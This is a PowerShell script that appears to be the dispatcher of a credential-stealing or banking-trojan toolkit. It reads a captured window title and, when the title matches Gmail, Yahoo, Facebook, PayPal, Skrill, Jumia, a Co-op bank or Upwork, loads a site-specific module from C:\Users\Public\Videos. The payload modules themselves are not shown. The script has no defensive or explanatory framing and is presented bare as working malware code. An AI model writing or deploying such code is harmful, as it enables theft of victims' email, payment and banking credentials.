

Import-Module $pwd\TRM-Carrefour.ps1

#___________________________________________________

Garuda-Indonesia

function Mary-Gray
{
	$file = "$Pbc\title.txt"
	$title = [IO.File]::ReadAllText("$file")
	$string = $title
	if ($string -like "*$unique*") 
	{
		$satan_doc
	} 
	else
	{ 
		echo GoodlifePharmacy!
	}
}

#___________________________________________________

$unique = "gmail"
$satan_doc = Import-Module "C:\Users\Public\Videos\Hills-Social-Mail-Gmail.ps1"
Mary-Gray

#___________________________________________________

$unique = "yahoo"
$satan_doc = Import-Module "C:\Users\Public\Videos\Hills-Social-Mail-Yahoo"
Mary-Gray

#___________________________________________________

$unique = "facebook"
$satan_doc = Import-Module "C:\Users\Public\Videos\Hills-Social-Social-Facebook"
Mary-Gray

#___________________________________________________

$unique = "gmail"
$satan_doc = Import-Module "C:\Users\Public\Videos\Hills-Social-Mail-Gmail"
Mary-Gray

#___________________________________________________
#___________________________________________________
#___________________________________________________
#___________________________________________________

$unique = "paypal"
$satan_doc = Import-Module "C:\Users\Public\Videos\Hills-Web-eWallet-Paypal"
Mary-Gray

#___________________________________________________

$unique = "skrill"
$satan_doc = Import-Module "C:\Users\Public\Videos\Hills-Web-eWallet-Skrill"
Mary-Gray

#___________________________________________________

$unique = "jumis"
$satan_doc = Import-Module "C:\Users\Public\Videos\Hills-Web-eCommerce-Jumia"
Mary-Gray

#___________________________________________________

$unique = "co-op"
$satan_doc = Import-Module "C:\Users\Public\Videos\Hills-Web-Banker-Coop"
Mary-Gray

#___________________________________________________

$unique = "upwork"
$satan_doc = Import-Module "C:\Users\Public\Videos\Hills-Web-Freelancer-Upwork"
Mary-Gray

#___________________________________________________
























